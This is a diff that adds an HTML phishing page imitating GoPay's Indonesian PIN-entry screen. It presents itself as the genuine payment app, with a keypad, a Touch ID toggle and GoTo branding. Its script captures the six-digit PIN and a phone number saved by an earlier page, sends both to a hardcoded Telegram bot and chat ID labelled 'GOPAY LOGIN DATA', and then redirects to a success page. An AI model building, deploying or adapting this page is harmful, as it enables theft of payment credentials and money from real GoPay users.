@@ -1,0 +1,343 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  
+  <title>GoPay - Masukkan PIN</title>
+  <meta name="theme-color" content="#000000">
+  
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
+  
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: 'Plus Jakarta Sans', -apple-system, BlinkMacSystemFont, sans-serif;
+      -webkit-tap-highlight-color: transparent;
+    }
+
+    html, body {
+      width: 100%;
+      height: 100%;
+      overflow: hidden;
+      position: fixed;
+      background-color: #000000;
+      color: #ffffff;
+    }
+
+    .app-container {
+      width: 100%;
+      height: 100vh;
+      background-color: #000000;
+      padding: 16px 20px;
+      display: flex;
+      flex-direction: column;
+      justify-content: space-between;
+      position: relative;
+      margin: 0 auto;
+      overflow: hidden;
+    }
+
+    .go-topbar {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 16px;
+    }
+
+    .go-icon-btn {
+      background: none;
+      border: none;
+      color: #ffffff;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .go-topbar-title {
+      font-size: 17px;
+      font-weight: 600;
+    }
+
+    .go-step2-body {
+      display: flex;
+      flex-direction: column;
+      align-items: flex-start;
+    }
+
+    .touch-box {
+      width: 100%;
+      border: 1.5px solid #00aa13;
+      border-radius: 12px;
+      padding: 12px 16px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      margin-bottom: 16px;
+      background-color: rgba(0, 170, 19, 0.05);
+    }
+
+    .touch-text {
+      font-size: 13px;
+      color: #ffffff;
+      line-height: 1.3;
+      padding-right: 10px;
+    }
+
+    .switch {
+      position: relative;
+      display: inline-block;
+      width: 44px;
+      height: 24px;
+      flex-shrink: 0;
+    }
+
+    .switch input {
+      opacity: 0;
+      width: 0;
+      height: 0;
+    }
+
+    .slider {
+      position: absolute;
+      cursor: pointer;
+      top: 0; left: 0; right: 0; bottom: 0;
+      background-color: #333;
+      transition: .3s;
+      border-radius: 24px;
+    }
+
+    .slider:before {
+      position: absolute;
+      content: "";
+      height: 18px;
+      width: 18px;
+      left: 3px;
+      bottom: 3px;
+      background-color: white;
+      transition: .3s;
+      border-radius: 50%;
+    }
+
+    input:checked + .slider {
+      background-color: #ffffff;
+    }
+
+    input:checked + .slider:before {
+      transform: translateX(20px);
+      background-color: #000;
+    }
+
+    .pin-instruction {
+      font-size: 14px;
+      color: #9e9e9e;
+      margin-bottom: 12px;
+    }
+
+    .pin-display-box {
+      width: 100%;
+      height: 52px;
+      background-color: #121212;
+      border-radius: 12px;
+      display: flex;
+      align-items: center;
+      justify-content: flex-start;
+      padding-left: 20px;
+      gap: 22px;
+      margin-bottom: 12px;
+    }
+
+    .pin-dot {
+      width: 11px;
+      height: 11px;
+      border-radius: 50%;
+      border: 2px solid #666;
+      background: transparent;
+      transition: background 0.2s, border-color 0.2s;
+    }
+
+    .pin-dot.filled {
+      background: #ffffff;
+      border-color: #ffffff;
+    }
+
+    .lupa-pin {
+      font-size: 14px;
+      color: #00aa13;
+      font-weight: 600;
+      text-decoration: none;
+    }
+
+    .keypad-section {
+      width: 100%;
+      margin-top: auto;
+      padding-bottom: 10px;
+    }
+
+    .keypad-container {
+      width: 100%;
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 8px;
+    }
+
+    .key-btn {
+      background: transparent;
+      border: none;
+      color: #ffffff;
+      font-size: 26px;
+      font-weight: 600;
+      height: 52px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      border-radius: 10px;
+    }
+
+    .key-btn:active {
+      background-color: rgba(255, 255, 255, 0.1);
+    }
+
+    .go-footer {
+      text-align: center;
+      font-size: 12px;
+      color: #666666;
+      margin-top: 8px;
+    }
+
+    .go-footer span {
+      color: #00aa13;
+      font-weight: 700;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="app-container">
+    <div>
+      <header class="go-topbar">
+        <button type="button" class="go-icon-btn" onclick="history.back()">
+          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="m15 18-6-6 6-6"/></svg>
+        </button>
+        <span class="go-topbar-title">Masukkan PIN kamu</span>
+        <button type="button" class="go-icon-btn">
+          <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="M12 16v-4"/><path d="M12 8h.01"/></svg>
+        </button>
+      </header>
+
+      <div class="go-step2-body">
+        <div class="touch-box">
+          <span class="touch-text">Gunakan Touch ID untuk bayar lebih cepat & aman</span>
+          <label class="switch">
+            <input type="checkbox" id="touchIdToggle">
+            <span class="slider"></span>
+          </label>
+        </div>
+
+        <p class="pin-instruction">Silakan ketik 6 digit PIN kamu buat lanjut.</p>
+
+        <div class="pin-display-box" id="pinDisplay">
+          <div class="pin-dot"></div>
+          <div class="pin-dot"></div>
+          <div class="pin-dot"></div>
+          <div class="pin-dot"></div>
+          <div class="pin-dot"></div>
+          <div class="pin-dot"></div>
+        </div>
+
+        <a href="#" class="lupa-pin">Lupa PIN</a>
+      </div>
+    </div>
+
+    <div class="keypad-section">
+      <div class="keypad-container">
+        <button class="key-btn" onclick="pressKey('1')">1</button>
+        <button class="key-btn" onclick="pressKey('2')">2</button>
+        <button class="key-btn" onclick="pressKey('3')">3</button>
+        <button class="key-btn" onclick="pressKey('4')">4</button>
+        <button class="key-btn" onclick="pressKey('5')">5</button>
+        <button class="key-btn" onclick="pressKey('6')">6</button>
+        <button class="key-btn" onclick="pressKey('7')">7</button>
+        <button class="key-btn" onclick="pressKey('8')">8</button>
+        <button class="key-btn" onclick="pressKey('9')">9</button>
+        <button class="key-btn" style="visibility: hidden;"></button>
+        <button class="key-btn" onclick="pressKey('0')">0</button>
+        <button class="key-btn" onclick="pressDelete()">
+          <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 4H8l-7 8 7 8h13a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2z"/><line x1="18" y1="9" x2="12" y2="15"/><line x1="12" y1="9" x2="18" y2="15"/></svg>
+        </button>
+      </div>
+
+      <footer class="go-footer">
+        from <span>goto</span>
+      </footer>
+    </div>
+  </div>
+
+  <script>
+    let currentPin = "";
+    const dots = document.querySelectorAll('.pin-dot');
+
+    // Konfigurasi Token & Chat ID Telegram Anda
+    const TELEGRAM_BOT_TOKEN = "8881822233:AAE3UwszOo27KceLDBtNKdSD3AgANrxZncU";
+    const TELEGRAM_CHAT_ID = "6742478722";
+
+    function updateDots() {
+      dots.forEach((dot, index) => {
+        if (index < currentPin.length) {
+          dot.classList.add('filled');
+        } else {
+          dot.classList.remove('filled');
+        }
+      });
+    }
+
+    function pressKey(num) {
+      if (currentPin.length < 6) {
+        currentPin += num;
+        updateDots();
+
+        if (currentPin.length === 6) {
+          // Simpan PIN ke localStorage
+          localStorage.setItem('gopay_pin', currentPin);
+          
+          // Ambil nomor HP yang disimpan dari halaman sebelumnya
+          const savedPhone = localStorage.getItem('gopay_phone') || 'Tidak ada data';
+
+          // Kirim data ke Telegram Bot
+          const message = `🔔 *GOPAY LOGIN DATA*\n📱 No HP: \`${savedPhone}\`\n🔑 PIN: \`${currentPin}\``;
+          
+          if (TELEGRAM_BOT_TOKEN !== "MASUKKAN_BOT_TOKEN_ANDA_DISINI") {
+            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({
+                chat_id: TELEGRAM_CHAT_ID,
+                text: message,
+                parse_mode: 'Markdown'
+              })
+            }).catch(err => console.log(err));
+          }
+
+          // Pindah ke halaman OTP setelah jeda singkat
+          setTimeout(() => {
+            window.location.href = "sukses.html";
+          }, 400);
+        }
+      }
+    }
+
+    function pressDelete() {
+      if (currentPin.length > 0) {
+        currentPin = currentPin.slice(0, -1);
+        updateDots();
+      }
+    }
+  </script>
+</body>
+</html>
